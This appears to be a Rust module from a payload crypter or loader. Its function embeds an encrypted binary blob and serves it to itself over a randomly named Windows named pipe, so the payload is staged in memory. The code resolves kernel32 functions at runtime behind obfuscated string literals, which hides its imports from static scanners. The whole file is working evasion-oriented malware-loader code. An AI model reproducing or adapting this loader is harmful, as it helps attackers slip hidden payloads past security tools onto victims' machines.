use std::ffi::{CString, c_void};
use std::thread;
use std::time::Duration;
use rand::Rng;
use std::ptr;
use crate::utils::{load_library, get_proc_address};
use rustcrypt_ct_macros::obf_lit_bytes;

pub fn load_payload() -> Result<Vec<u8>, String> {
    const ENCRYPT_DATA: &'static [u8] = include_bytes!("../encrypt.bin");
    let encrypted_data = ENCRYPT_DATA.to_vec();

    // Generate random pipe name
    let random: u32 = rand::thread_rng().gen_range(10000..99999);
    let pipe_name_str = format!("\\\\.\\pipe\\rsl_pipe_{}", random);
    let pipe_name_c = CString::new(pipe_name_str.clone()).map_err(|e| e.to_string())?;

    // Start server thread
    let server_data = encrypted_data.clone();
    let server_pipe_name = pipe_name_c.clone();
    
    thread::spawn(move || {
        unsafe {
            if let Ok(kernel32) = load_library(obf_lit_bytes!(b"kernel32.dll\0").as_slice()) {
                // Define function types
                type CreateNamedPipeAFn = unsafe extern "system" fn(*const u8, u32, u32, u32, u32, u32, u32, *const c_void) -> isize;
                type ConnectNamedPipeFn = unsafe extern "system" fn(isize, *mut c_void) -> i32;
                type WriteFileFn = unsafe extern "system" fn(isize, *const u8, u32, *mut u32, *mut c_void) -> i32;
                type DisconnectNamedPipeFn = unsafe extern "system" fn(isize) -> i32;
                type CloseHandleFn = unsafe extern "system" fn(isize) -> i32;
                type GetLastErrorFn = unsafe extern "system" fn() -> u32;

                // Load functions
                let create_named_pipe_a: CreateNamedPipeAFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"CreateNamedPipeA\0").as_slice()).unwrap_or(ptr::null()));
                let connect_named_pipe: ConnectNamedPipeFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"ConnectNamedPipe\0").as_slice()).unwrap_or(ptr::null()));
                let write_file: WriteFileFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"WriteFile\0").as_slice()).unwrap_or(ptr::null()));
                let disconnect_named_pipe: DisconnectNamedPipeFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"DisconnectNamedPipe\0").as_slice()).unwrap_or(ptr::null()));
                let close_handle: CloseHandleFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"CloseHandle\0").as_slice()).unwrap_or(ptr::null()));
                let get_last_error: GetLastErrorFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"GetLastError\0").as_slice()).unwrap_or(ptr::null()));

                if create_named_pipe_a as usize != 0 {
                    let h_pipe = create_named_pipe_a(
                        server_pipe_name.as_ptr() as *const u8,
                        0x00000002, // PIPE_ACCESS_OUTBOUND
                        0x00000000 | 0x00000000 | 0x00000000, // PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT (defaults are 0)
                        1, // Max instances
                        server_data.len() as u32 + 4096, // Out buffer
                        server_data.len() as u32 + 4096, // In buffer
                        0, // Default timeout
                        ptr::null()
                    );

                    if h_pipe != -1 { // INVALID_HANDLE_VALUE
                        let connected = connect_named_pipe(h_pipe, ptr::null_mut());
                        if connected != 0 || get_last_error() == 535 { // ERROR_PIPE_CONNECTED
                            let mut bytes_written = 0;
                            write_file(
                                h_pipe,
                                server_data.as_ptr(),
                                server_data.len() as u32,
                                &mut bytes_written,
                                ptr::null_mut()
                            );
                            thread::sleep(Duration::from_millis(100));
                        }
                        disconnect_named_pipe(h_pipe);
                        close_handle(h_pipe);
                    }
                }
            }
        }
    });

    // Client side
    thread::sleep(Duration::from_millis(50));

    let mut attempts = 0;
    const MAX_ATTEMPTS: u32 = 20;
    
    unsafe {
        let kernel32 = load_library(obf_lit_bytes!(b"kernel32.dll\0").as_slice())?;
        type CreateFileAFn = unsafe extern "system" fn(*const u8, u32, u32, *const c_void, u32, u32, isize) -> isize;
        type ReadFileFn = unsafe extern "system" fn(isize, *mut u8, u32, *mut u32, *mut c_void) -> i32;
        type CloseHandleFn = unsafe extern "system" fn(isize) -> i32;

        let create_file_a: CreateFileAFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"CreateFileA\0").as_slice()).map_err(|_| "Failed to load CreateFileA")?);
        let read_file: ReadFileFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"ReadFile\0").as_slice()).map_err(|_| "Failed to load ReadFile")?);
        let close_handle: CloseHandleFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"CloseHandle\0").as_slice()).map_err(|_| "Failed to load CloseHandle")?);

        while attempts < MAX_ATTEMPTS {
             let h_file = create_file_a(
                pipe_name_c.as_ptr() as *const u8,
                0x80000000, // GENERIC_READ
                0, // No sharing
                ptr::null(),
                3, // OPEN_EXISTING
                0x00000080, // FILE_ATTRIBUTE_NORMAL
                0
            );
            
            if h_file != -1 { // INVALID_HANDLE_VALUE
                let mut buffer = vec![0u8; encrypted_data.len()];
                let mut bytes_read = 0;
                
                let success = read_file(
                    h_file,
                    buffer.as_mut_ptr(),
                    buffer.len() as u32,
                    &mut bytes_read,
                    ptr::null_mut()
                );
                
                close_handle(h_file);
                
                if success != 0 && bytes_read as usize == encrypted_data.len() {
                    return Ok(buffer);
                }
            }
            
            thread::sleep(Duration::from_millis(100));
            attempts += 1;
        }
    }

    Err("Failed to read from named pipe".to_string())
}
